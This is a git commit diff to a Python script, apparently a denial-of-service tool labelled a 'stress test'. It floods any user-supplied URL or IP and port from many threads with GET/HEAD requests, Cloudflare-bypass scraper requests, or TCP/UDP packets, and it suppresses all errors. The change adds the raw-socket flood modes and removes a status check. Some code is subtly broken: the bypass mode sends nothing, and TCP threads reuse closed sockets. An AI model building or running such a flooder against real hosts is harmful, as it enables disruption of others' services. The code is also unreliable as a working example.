a242c9898f94d1228bce2b8dab296792e8a112b4
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-07-18 21:33:55 +0600

    Update main.py

--- main.py
+++ main.py
@@ -1,5 +1,6 @@
 import cloudscraper
 import httpx
+import socket
 import threading
 import time
 from colorama import Fore, Style, init
@@ -8,10 +9,15 @@ from colorama import Fore, Style, init
 init()
 
 # Set the protocol/method to use for sending requests
-protocol = input("Enter the protocol/method to use (cfb or get): ")
+protocol = input("Enter the protocol/method to use (tcp, udp, get, head, or cfb): ")
 
-# Set the URL of the website to test
-url = input("Enter the website URL (including http or https): ")
+if protocol in ["get", "head", "cfb"]:
+    # Set the URL of the website to test
+    url = input("Enter the website URL (including http or https): ")
+elif protocol in ["tcp", "udp"]:
+    # Set the IP address and port of the server to test
+    ip = input("Enter the IP address of the server: ")
+    port = int(input("Enter the port number: "))
 
 # Set the number of threads to use
 num_threads = int(input("Enter the number of threads to use: "))
@@ -19,47 +25,52 @@ num_threads = int(input("Enter the number of threads to use: "))
 # Set the duration of the stress test in seconds
 duration = int(input("Enter the duration of the stress test in seconds: "))
 
-# Set the interval for checking the website status in seconds
-status_interval = 10
-
 def stress_test(thread_id):
     if protocol == "cfb":
         client = cloudscraper.create_scraper()
-    elif protocol == "get":
+    elif protocol in ["get", "head"]:
         client = httpx.Client()
+    elif protocol == "tcp":
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    elif protocol == "udp":
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     else:
         print(Fore.RED + f"Invalid protocol: {protocol}" + Style.RESET_ALL)
         return
 
     start_time = time.time()
     if thread_id == 0:
-        print(Fore.YELLOW + f"Stressing started on {url} successfully!" + Style.RESET_ALL)
+        if protocol in ["get", "head", "cfb"]:
+            print(Fore.YELLOW + f"Stressing started on {url} successfully!" + Style.RESET_ALL)
+        elif protocol in ["tcp", "udp"]:
+            print(Fore.YELLOW + f"Stressing started on {ip}:{port} successfully!" + Style.RESET_ALL)
     while time.time() - start_time < duration:
-        send_request(client)
-        if thread_id == 0:
-            time.sleep(status_interval)
-            check_status(client)
+        if protocol in ["get", "head", "cfb"]:
+            send_request(client)
+        elif protocol in ["tcp", "udp"]:
+            send_packet(sock)
     if thread_id == 0:
         print(Fore.YELLOW + "Stress test ended." + Style.RESET_ALL)
 
 def send_request(client):
     try:
-        response = client.get(url)
+        if protocol == "get":
+            response = client.get(url)
+        elif protocol == "head":
+            response = client.head(url)
     except Exception as e:
         pass # Suppress error messages
 
-def check_status(client):
+def send_packet(sock):
     try:
-        start_time = time.time()
-        response = client.get(url)
-        end_time = time.time()
-        response_time = end_time - start_time
-        if response.status_code == 200:
-            print(Fore.GREEN + f"{url} is online (response time: {response_time:.2f} seconds)" + Style.RESET_ALL)
-        else:
-            print(Fore.RED + f"{url} is offline" + Style.RESET_ALL)
-    except:
-        print(Fore.RED + f"{url} is offline" + Style.RESET_ALL)
+        if protocol == "tcp":
+            sock.connect((ip, port))
+            sock.send(b"Stress test packet")
+            sock.close()
+        elif protocol == "udp":
+            sock.sendto(b"Stress test packet", (ip, port))
+    except Exception as e:
+        pass # Suppress error messages
 
 # Create and start the threads
 threads = []
